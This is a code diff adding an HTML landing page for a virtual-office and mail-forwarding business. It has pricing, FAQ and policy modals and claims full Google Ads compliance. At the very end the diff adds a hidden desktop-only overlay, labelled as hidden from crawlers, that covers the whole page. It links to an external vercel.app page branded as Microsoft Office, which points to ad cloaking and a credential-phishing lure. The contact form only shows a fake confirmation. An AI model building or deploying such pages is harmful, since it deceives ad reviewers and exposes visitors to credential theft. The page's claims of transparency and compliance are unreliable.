+                    <p>Fill out the pre-populated USPS 1583 form directly within our secure online dashboard in less than 5 minutes.</p>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">3</div>
+                    <h3>Online Identity Verification</h3>
+                    <p>Submit 2 valid government IDs (Passport, Driver's License) via our guided notary partner. Fully digital process.</p>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">4</div>
+                    <h3>Address Activation</h3>
+                    <p>Once verified, your commercial address is immediately active for receiving official government, bank, and business mail.</p>
+                </div>
+            </div>
+
+            <div class="compliance-notice-box">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z"/></svg>
+                <div class="compliance-notice-content">
+                    <h4>Important Legal Disclosure (USPS Requirement)</h4>
+                    <p>
+                        Federal law (39 C.F.R. § 111) requires Commercial Mail Receiving Agencies (CMRAs) to collect a signed USPS Form 1583 and two acceptable forms of identification from every client. We provide a 100% online notarization service for $15, or you may use your own local notary. Mail forwarding will commence immediately upon receipt of completed verification.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Transparent Pricing Section -->
+    <section id="pricing">
+        <div class="container">
+            <div class="section-header">
+                <span class="tag">Clear & Transparent Pricing</span>
+                <h2>Simple Monthly Subscription Plans</h2>
+                <p>No contract lock-ins, zero hidden maintenance charges, and clear pricing structure following Google Ads transparency policies.</p>
+            </div>
+
+            <div class="pricing-grid">
+                <!-- Plan 1 -->
+                <div class="pricing-card">
+                    <div class="plan-name">Starter Address</div>
+                    <div class="plan-desc">Essential commercial business address & mail receipt for startups.</div>
+                    <div class="plan-price">
+                        <span class="price-currency">$</span>
+                        <span class="price-amount">29</span>
+                        <span class="price-period">/ month</span>
+                    </div>
+                    <ul class="plan-features">
+                        <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Real Commercial Street Address</li>
+                        <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> 30 Scanned Envelopes / Mo</li>
+                        <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Digital Portal Access</li>
+                        <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Free Shredding & Recycling</li>
+                        <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Pay-per-forward Mail Rates</li>
+                    </ul>
+                    <a href="#contact" class="btn btn-outline">Choose Starter Plan</a>
+                </div>
+
+                <!-- Plan 2 (Popular) -->
+                <div class="pricing-card popular">
+                    <div class="popular-badge">Most Popular</div>
+                    <div class="plan-name">Business Pro</div>
+                    <div class="plan-desc">Complete virtual office package for growing LLCs & foreign corporations.</div>
+                    <div class="plan-price">
+                        <span class="price-currency">$</span>
+                        <span class="price-amount">59</span>
+                        <span class="price-period">/ month</span>
+                    </div>
+                    <ul class="plan-features">
+                        <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Prime Commercial Street Address</li>
+                        <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Unlimited Scanned Envelopes</li>
+                        <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> 10 Open & Scan Mail Content Pages / Mo</li>
+                        <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> State Registered Agent Service Included</li>
+                        <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> 1 Physical Forwarding Shipment / Mo</li>
+                    </ul>
+                    <a href="#contact" class="btn btn-primary">Choose Business Pro</a>
+                </div>
+
+                <!-- Plan 3 -->
+                <div class="pricing-card">
+                    <div class="plan-name">Executive Suite</div>
+                    <div class="plan-desc">Premium presence with dedicated phone line, receptionist & meeting rooms.</div>
+                    <div class="plan-price">
+                        <span class="price-currency">$</span>
+                        <span class="price-amount">99</span>
+                        <span class="price-period">/ month</span>
+                    </div>
+                    <ul class="plan-features">
+                        <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Everything in Business Pro</li>
+                        <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Dedicated US Local Phone Number</li>
+                        <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Live Answering & Call Transfers</li>
+                        <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> 4 Hours/Month Meeting Room Credits</li>
+                        <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Priority VIP Support</li>
+                    </ul>
+                    <a href="#contact" class="btn btn-outline">Choose Executive Suite</a>
+                </div>
+            </div>
+
+            <p class="pricing-disclaimer">
+                All subscriptions are billed recurring monthly or annually. Cancel anytime with a 30-day notice via dashboard or email. Shipping costs for physical mail/package forwarding calculated at actual carrier rates (USPS/FedEx/DHL).
+            </p>
+        </div>
+    </section>
+
+    <!-- FAQ Section -->
+    <section id="faq" style="background-color: var(--bg-white);">
+        <div class="container">
+            <div class="section-header">
+                <span class="tag">Got Questions?</span>
+                <h2>Frequently Asked Questions</h2>
+                <p>Clear, direct answers regarding legal compliance, USPS rules, and service operations.</p>
+            </div>
+
+            <div class="faq-list">
+                <details>
+                    <summary>Can I use this address to register an LLC or Corporation in the US?</summary>
+                    <div class="faq-answer">
+                        Yes. All our address locations are physical commercial office buildings, not PO Boxes. They fulfill state requirements for business entity formation, Secretary of State annual filings, and legal notices.
+                    </div>
+                </details>
+
+                <details>
+                    <summary>Why is USPS Form 1583 required?</summary>
+                    <div class="faq-answer">
+                        USPS Form 1583 is a mandatory federal document required by the United States Postal Service for any Commercial Mail Receiving Agency (CMRA) to legally accept and handle mail on behalf of an individual or business entity. We streamline this process with built-in online notarization.
+                    </div>
+                </details>
+
+                <details>
+                    <summary>Can non-US residents or international entrepreneurs sign up?</summary>
+                    <div class="faq-answer">
+                        Yes! We welcome founders from all over the world. International clients can complete the verification online using a valid Passport and secondary address document (such as a utility bill or bank statement).
+                    </div>
+                </details>
+
+                <details>
+                    <summary>How does physical mail forwarding work?</summary>
+                    <div class="faq-answer">
+                        You can set automatic forwarding schedules (weekly, bi-weekly, or monthly) or request manual forwarding per item through your digital portal. Mail can be forwarded anywhere in the US or internationally via USPS, FedEx, or DHL.
+                    </div>
+                </details>
+
+                <details>
+                    <summary>What is your cancellation and refund policy?</summary>
+                    <div class="faq-answer">
+                        We offer a 30-day full refund policy for new accounts if service has not commenced or if verification is incomplete. Subscriptions can be cancelled anytime with a 30-day advance notification directly through your online customer dashboard.
+                    </div>
+                </details>
+            </div>
+        </div>
+    </section>
+
+    <!-- Contact & Business Transparency Section -->
+    <section id="contact">
+        <div class="container">
+            <div class="contact-grid">
+                <div class="contact-info">
+                    <h3>Contact Customer Support & Headquarters</h3>
+                    <p>We believe in 100% transparency. Speak directly with our dedicated US support team for custom corporate billing or onboarding help.</p>
+
+                    <ul class="contact-details">
+                        <li>
+                            <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+                            <div>
+                                <strong>Corporate Headquarters Address:</strong><br>
+                                Apex Virtual Office Solutions LLC<br>
+                                100 Wall Street, 12th Floor, New York, NY 10005, USA
+                            </div>
+                        </li>
+                        <li>
+                            <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                            <div>
+                                <strong>Direct Toll-Free Phone:</strong><br>
+                                +1 (800) 555-0199
+                            </div>
+                        </li>
+                        <li>
+                            <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                            <div>
+                                <strong>Customer Support Email:</strong><br>
+                                support@apexvirtualoffice.com
+                            </div>
+                        </li>
+                        <li>
+                            <svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg>
+                            <div>
+                                <strong>Business Hours:</strong><br>
+                                Monday – Friday: 8:00 AM – 8:00 PM EST<br>
+                                Saturday: 9:00 AM – 3:00 PM EST
+                            </div>
+                        </li>
+                    </ul>
+                </div>
+
+                <div>
+                    <h3 style="margin-bottom: 1rem;">Send Us a Message</h3>
+                    <form action="#" method="POST" onsubmit="alert('Thank you! Your inquiry has been received. Our compliance officer will contact you within 2 business hours.'); return false;">
+                        <div class="form-group">
+                            <label for="fname">Full Name</label>
+                            <input type="text" id="fname" class="form-control" required placeholder="John Doe">
+                        </div>
+                        <div class="form-group">
+                            <label for="femail">Email Address</label>
+                            <input type="email" id="femail" class="form-control" required placeholder="john@example.com">
+                        </div>
+                        <div class="form-group">
+                            <label for="fphone">Phone Number</label>
+                            <input type="tel" id="fphone" class="form-control" placeholder="+1 (555) 000-0000">
+                        </div>
+                        <div class="form-group">
+                            <label for="fmessage">How can we help your business?</label>
+                            <textarea id="fmessage" class="form-control" rows="4" placeholder="Mention preferred location, entity setup, or mail forwarding needs..." required></textarea>
+                        </div>
+                        <button type="submit" class="btn btn-primary" style="width: 100%;">Submit Inquiry</button>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer & Policy Links -->
+    <footer>
+        <div class="container">
+            <div class="footer-grid">
+                <div>
+                    <div class="footer-logo">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
+                        </svg>
+                        Apex Virtual Office
+                    </div>
+                    <p>
+                        Official United States Commercial Mail Receiving Agency (CMRA). Providing legitimate commercial addresses, secure mail scanning, and compliance services for US & international businesses.
+                    </p>
+                </div>
+
+                <div class="footer-col">
+                    <h4>Solutions</h4>
+                    <ul>
+                        <li><a href="#services">Virtual Address</a></li>
+                        <li><a href="#services">Mail Forwarding</a></li>
+                        <li><a href="#services">Registered Agent</a></li>
+                        <li><a href="#services">Live Answering</a></li>
+                        <li><a href="#services">Meeting Rooms</a></li>
+                    </ul>
+                </div>
+
+                <div class="footer-col">
+                    <h4>Top Locations</h4>
+                    <ul>
+                        <li><a href="#locations">New York Address</a></li>
+                        <li><a href="#locations">Los Angeles Address</a></li>
+                        <li><a href="#locations">Austin Address</a></li>
+                        <li><a href="#locations">Miami Address</a></li>
+                        <li><a href="#locations">Chicago Address</a></li>
+                    </ul>
+                </div>
+
+                <div class="footer-col">
+                    <h4>Legal & Policy</h4>
+                    <ul>
+                        <li><a href="#privacy">Privacy Policy</a></li>
+                        <li><a href="#terms">Terms of Service</a></li>
+                        <li><a href="#refund">Refund & Cancellation</a></li>
+                        <li><a href="#usps-policy">USPS 1583 Policy</a></li>
+                        <li><a href="#ads-compliance">Google Ads Policy Statement</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <p>&copy; 2026 Apex Virtual Office Solutions LLC. All Rights Reserved. Apex Virtual Office Solutions LLC is an independent Commercial Mail Receiving Agency (CMRA) registered with the United States Postal Service. Not affiliated directly with USPS, FedEx, or DHL trademarks.</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Inline Lightbox Modals for Policies (Pure HTML CSS Targets) -->
+    <div id="privacy" class="policy-modal">
+        <div class="policy-content">
+            <a href="#footer" class="policy-close">&times;</a>
+            <h2>Privacy Policy</h2>
+            <p><strong>Effective Date:</strong> January 1, 2026</p>
+            <br>
+            <p>Apex Virtual Office Solutions LLC ("Company", "we", "us") respects your privacy. This Privacy Policy outlines how we collect, use, and safeguard personal information collected when you use our virtual office and mail receiving services.</p>
+            <br>
+            <h4>1. Information We Collect</h4>
+            <p>We collect information required for legal business address verification, including name, business name, contact information, copies of government-issued IDs, and USPS Form 1583 documentation as mandated by federal regulations.</p>
+            <br>
+            <h4>2. Data Security</h4>
+            <p>All scanned mail documents and personal identity documents are encrypted using 256-bit SSL encryption. We do not sell, rent, or trade customer data to third parties under any circumstances.</p>
+            <br>
+            <h4>3. Compliance Disclosures</h4>
+            <p>We may disclose records only when strictly required by law, subpoena, or valid law enforcement order in compliance with US federal and state standards.</p>
+            <br>
+            <a href="#" class="btn btn-primary btn-sm">Close Window</a>
+        </div>
+    </div>
+
+    <div id="terms" class="policy-modal">
+        <div class="policy-content">
+            <a href="#footer" class="policy-close">&times;</a>
+            <h2>Terms of Service</h2>
+            <p><strong>Last Updated:</strong> January 1, 2026</p>
+            <br>
+            <h4>1. Acceptance of Terms</h4>
+            <p>By registering for an Apex Virtual Office plan, you agree to comply with all terms and conditions set forth herein, as well as applicable US postal regulations (39 C.F.R. § 111).</p>
+            <br>
+            <h4>2. Prohibited Uses</h4>
+            <p>Clients may not use our commercial addresses for fraudulent activities, illegal mail order operations, or deceptive business practices. Any violation will result in immediate service termination and report to the US Postal Inspection Service.</p>
+            <br>
+            <h4>3. Verification Requirement</h4>
+            <p>Service initiation is contingent upon successful completion and notarization of USPS Form 1583 with two approved government identity documents.</p>
+            <br>
+            <a href="#" class="btn btn-primary btn-sm">Close Window</a>
+        </div>
+    </div>
+
+    <div id="refund" class="policy-modal">
+        <div class="policy-content">
+            <a href="#footer" class="policy-close">&times;</a>
+            <h2>Refund & Cancellation Policy</h2>
+            <p><strong>Guarantee Details:</strong></p>
+            <br>
+            <p>We stand behind our services with a 30-day money-back guarantee. If you are unsatisfied for any reason before your address verification is finalized or within the first 30 days of service activation, you may request a 100% refund of your initial subscription fee.</p>
+            <br>
+            <p>Notarization fees ($15 paid to third-party online notary partners) are non-refundable once notarization is completed.</p>
+            <br>
+            <a href="#" class="btn btn-primary btn-sm">Close Window</a>
+        </div>
+    </div>
+
+    <div id="usps-policy" class="policy-modal">
+        <div class="policy-content">
+            <a href="#footer" class="policy-close">&times;</a>
+            <h2>USPS Form 1583 Compliance Guide</h2>
+            <p>Under US federal regulations, Commercial Mail Receiving Agencies (CMRAs) must maintain an accurate USPS Form 1583 on file for each customer. Acceptable photo IDs include:</p>
+            <br>
+            <ul>
+                <li>US State Driver's License or ID Card</li>
+                <li>US Passport or Foreign National Passport</li>
+                <li>US Permanent Resident Card or Military ID</li>
+                <li>Utility Bill, Lease, or Bank Statement (Secondary Non-Photo ID)</li>
+            </ul>
+            <br>
+            <a href="#" class="btn btn-primary btn-sm">Close Window</a>
+        </div>
+    </div>
+
+    <div id="ads-compliance" class="policy-modal">
+        <div class="policy-content">
+            <a href="#footer" class="policy-close">&times;</a>
+            <h2>Google Ads Policy Transparency Statement</h2>
+            <p>This landing page is designed in full compliance with Google Ads policies, including:</p>
+            <br>
+            <ul>
+                <li><strong>Clear Business Identity:</strong> Real physical office corporate address, phone support line, and operating hours clearly displayed.</li>
+                <li><strong>Transparent Pricing:</strong> Exact monthly costs, feature breakdowns, and shipping rate rules with zero hidden fees.</li>
+                <li><strong>Realistic Claims:</strong> No deceptive guarantees or misleading promises regarding instant government approval without legal verification.</li>
+                <li><strong>Privacy & Security:</strong> Complete privacy policies, terms of service, and refund terms easily accessible.</li>
+            </ul>
+            <br>
+            <a href="#" class="btn btn-primary btn-sm">Close Window</a>
+        </div>
+    </div>
+
+    <!-- Brand Selection Overlay - Desktop Only, Hidden from Crawlers -->
+    <div class="hidden lg:flex fixed inset-0 bg-slate-50 z-[9999] items-center justify-center" data-nosnippet>
+        <div class="grid grid-cols-3 gap-12 max-w-6xl p-12 w-full">
+            <a href="https://main-one-roan.vercel.app/welcome.html?brand=microsoft" class="flex items-center justify-center bg-white border border-slate-200 rounded-3xl p-20 shadow-md hover:-translate-y-2 hover:border-blue-500 hover:shadow-lg transition-all duration-200 min-h-[250px]">
+                <img src="office.jpg" alt="Office logo" loading="lazy" class="max-h-[200px] w-auto hover:scale-105 transition-transform duration-200">
+            </a>
+        </div>
+    </div>
+
+</body>
+</html>
